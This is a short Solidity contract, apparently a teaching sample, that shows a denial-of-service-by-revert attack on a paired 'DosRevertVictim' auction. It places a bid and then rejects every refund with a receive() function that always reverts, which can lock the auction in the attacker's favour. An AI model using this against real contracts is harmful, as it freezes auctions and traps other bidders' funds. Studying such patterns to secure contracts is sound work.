// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./DosRevertVictim.sol";

contract DosRevertAttacker {
    function bid(address payable _victim) external payable {
        DosRevertVictim(_victim).bid{value: msg.value}();
    }

    receive() external payable {
        require(1 == 2);
    }
}